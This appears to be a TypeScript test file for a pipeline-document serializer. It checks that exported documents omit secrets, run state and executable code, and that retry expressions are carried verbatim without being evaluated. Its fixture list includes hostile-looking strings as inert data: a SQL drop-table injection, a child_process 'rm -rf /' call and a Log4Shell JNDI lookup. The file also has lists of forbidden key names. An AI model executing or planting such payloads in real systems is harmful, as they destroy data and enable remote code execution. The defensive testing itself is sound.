describe('Feature 085 T062 — the document carries only authored catalog fields (FR-007)', () => {
  it('emits no key outside the serializer key orders, at any depth', () => {
    const text = emitWith(FULL, [SPECIFY_PHASE, PLAN_PHASE]);
    const unauthorized = [...new Set(documentKeys(text))].filter(
      (key) => !AUTHORIZED_KEYS.has(key)
    );
    expect(unauthorized).toEqual([]);
    // The scan must find keys, or the assertion above is vacuous.
    expect(documentKeys(text).length).toBeGreaterThan(20);
  });

  it('names no host-owned runtime policy in any key order', () => {
    // These are decided by the installation that runs the work, not by the
    // operator who authored the resource. A document declaring one would be
    // telling a receiving host how to run rather than what to run.
    const HOST_OWNED = [
      'autocompact',
      'autoCompactPctOverride',
      'fatalsignature',
      'fatalSignatures',
      'permissionmode',
      'allowedtools',
      'disallowedtools',
      'mcpservers',
      'env',
      'apikey',
      'cwd',
      'sessionid',
      'workspaceroot',
      'trust',
      'capability',
      'ratelimit',
      'backoff'
    ];
    const declared = [...AUTHORIZED_KEYS].map((key) => key.toLowerCase());
    for (const owned of HOST_OWNED) {
      expect(declared).not.toContain(owned.toLowerCase());
    }
  });

  it('drops a field the orders do not name, rather than passing it through', () => {
    // The mechanism, not just the outcome: a definition polluted with an extra
    // field emits a document without it. A serializer that iterated the object
    // instead of the order would leak whatever a caller attached.
    const polluted = {
      ...MINIMAL,
      sessionId: 'sess-1',
      apiKey: 'sk-not-a-real-key',
      queue: ['task-1']
    } as unknown as PipelineDefinition;
    const text = emit(polluted);
    expect(text).not.toContain('sessionId');
    expect(text).not.toContain('sk-not-a-real-key');
    expect(text).not.toContain('queue');
    expect(text).toBe(emit(MINIMAL));
  });
});

describe('Feature 085 T062 — nothing about a run travels (FR-051)', () => {
  const RUN_SHAPED = [
    'runId',
    'runState',
    'status',
    'sessionId',
    'transcript',
    'queueId',
    'queueLifecycle',
    'history',
    'auditLog',
    'occurredAt',
    'startedAt',
    'completedAt',
    'result',
    'output',
    'token',
    'secret',
    'password',
    'credential'
  ];

  it('declares no run-shaped key in the format', () => {
    const declared = [...AUTHORIZED_KEYS].map((key) => key.toLowerCase());
    for (const key of RUN_SHAPED) {
      expect(declared).not.toContain(key.toLowerCase());
    }
  });

  it('reports a run-shaped key in a document as an unknown field, not a value', () => {
    // The read direction. A document someone hand-wrote can declare anything;
    // what matters is that the reader names it a defect rather than carrying it.
    const withRunState = pkg({
      metadata: [...WELL_FORMED_METADATA],
      spec: [...WELL_FORMED_SPEC, 'sessionId: sess-1', 'runState: running']
    });
    const codes = codesOf(defectsOf(withRunState));
    expect(codes.length).toBeGreaterThan(0);
    // `codesOf` yields `field/code`, so this says: every defect is an
    // unknown-field defect, and each names the key the document declared.
    expect([...codes].sort()).toEqual(['runState/unknown-field', 'sessionId/unknown-field']);
    // And the value is nowhere in what the reader produced.
    expect(JSON.stringify(read(withRunState))).not.toContain('sess-1');
  });

  it('carries no generated result even when the Pipeline declares output ports', () => {
    // An output PORT is a declaration of shape; an output VALUE is a run
    // artifact. The format has the first and no way to express the second.
    const text = emit(FULL);
    expect(text).toContain('outputs:');
    expect(text).toContain('portId: plan-document');
    for (const key of ['value:', 'produced:', 'artifact:', 'content:']) {
      expect(text).not.toContain(key);
    }
  });
});

describe('Feature 085 T062 — no executable extension code is transported (FR-052)', () => {
  it('declares no key that would name or hold code', () => {
    const CODE_SHAPED = [
      'command',
      'script',
      'shell',
      'exec',
      'eval',
      'require',
      'module',
      'plugin',
      'extension',
      'hook',
      'callback',
      'handler',
      'code'
    ];
    const declared = [...AUTHORIZED_KEYS].map((key) => key.toLowerCase());
    for (const key of CODE_SHAPED) {
      expect(declared).not.toContain(key.toLowerCase());
    }
  });

  it('carries `skill` as a name the receiver resolves, never as a body', () => {
    // The one field that REFERS to something executable. It is a reference, and
    // it is never followed on this path (FR-007, QS-25) — which is exactly what
    // stops a document from shipping behavior along with its declaration.
    const text = emitWith(FULL, [SPECIFY_PHASE, PLAN_PHASE]);
    expect(text).toContain('skill: ');
    // A scalar on one line: no block literal, no nested mapping under it.
    const skillLines = text.split('\n').filter((line) => line.trim().startsWith('skill:'));
    expect(skillLines.length).toBeGreaterThan(0);
    for (const line of skillLines) {
      expect(line.trim()).toMatch(/^skill: \S/);
      expect(line).not.toContain('|-');
    }
  });
});

// ---------------------------------------------------------------------------
// Feature 085 T063 — `retryCondition` is inert on this path (FR-053)
// ---------------------------------------------------------------------------
//
// Standing hard rule: `repo/src/lib/retry-condition.ts` is the only thing that
// ever reads this expression, at run time, inside the sandboxed evaluator. To
// the exchange path the field is text — validated for presence and
// non-emptiness, carried verbatim, handed on.
//
// The temptation these tests exist to foreclose is a reasonable-sounding one:
// pre-check the expression at import so the operator learns early. That reads
// operator-authored content from an untrusted document, which is the definition
// of putting an evaluator on this path. The capability gate keys on the field's
// PRESENCE, never on its contents.

describe('Feature 085 T063 — retryCondition is carried, never read (FR-053)', () => {
  const EXPRESSIONS = [
    'exitCode != 0',
    'attempt < 3 && exitCode != 0',
    // Syntactically wrong for the DSL. Still carried: deciding it is wrong is
    // the evaluator's job, and doing it here would BE an evaluator.
    'exitCode !=',
    '((((',
    // Shaped like an injection attempt against a language this path does not
    // have. Inert text, carried byte for byte.
    "'; DROP TABLE phases; --",
    'require("child_process").exec("rm -rf /")',
    '${jndi:ldap://example.invalid/a}',
    'a'.repeat(500)
  ];

  it.each(EXPRESSIONS)('carries %j verbatim through a round trip', (expression) => {
    const phase: PhaseDefinition = {
      phaseId: 'retry-me',
      name: 'Retry Me',
      version: 1,
      instruction: 'Try again.',
      retryCondition: expression
    };
    // Through bytes and back, because carrying the expression verbatim is a
    // claim about the document, not about an in-memory object.
    const text = serializePhaseDocument(documentFromPhaseDefinition(phase));
    const parsed = parseDocumentText(text);
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    const validated = validatePhaseDocument(parsed.node);
    expect(validated.ok).toBe(true);
    if (!validated.ok) return;
    expect(phaseDefinitionFromDocument(validated.document).retryCondition).toBe(expression);
  });

  it('rejects only absence and emptiness, which are not readings of the contents', () => {
    const withEmpty = pkg({
      metadata: [...WELL_FORMED_METADATA],
      spec: [...WELL_FORMED_SPEC],
      phases: [
        includedPhase(
          ['phaseId: specify', 'name: Specify', 'version: 1'],
          ['instruction: Go.', 'retryCondition: ""']
        )
      ]
    });
    // Index 1: the root Pipeline is resource 0, the included Phase is next.
    const codes = codesOf(defectsOf(withEmpty, 1));
    expect(codes).toContain('retryCondition/non-empty-required');
  });

  it('does not import the evaluator, so it cannot call it', () => {
    // Structural, because a behavioral test cannot prove a call did not happen
    // on some path it did not exercise. If no module on this path can reach the
    // evaluator, no code on this path can evaluate.
    const MODULES = [
      'pipeline-document.ts',
      'phase-yaml-validator.ts',
      'phase-yaml-mapper.ts',
      'yaml-serializer.ts',
      'yaml-parser.ts',
      'yaml-scanner.ts',
      'scalar-style.ts',
      'import-planner.ts',
      'package-resolver.ts',
      'pipeline-export-selection.ts'
    ];
    for (const module of MODULES) {
      const raw = readFileSync(
        resolve(__dirname, '../../../src/services/process-yaml', module),
        'utf8'
      );
      // Comments are stripped first: `yaml-scanner.ts` CITES the evaluator as
      // the hand-rolled-parser precedent it followed, which is the opposite of
      // depending on it. What matters is the import graph.
      const declarations = raw
        .replace(/\/\*[\s\S]*?\*\//g, '\n')
        .replace(/(^|[^:])\/\/.*$/gm, '$1');
      expect(declarations).not.toContain('retry-condition');
      expect(declarations).not.toContain('evaluateRetryCondition');
    }
  });
});
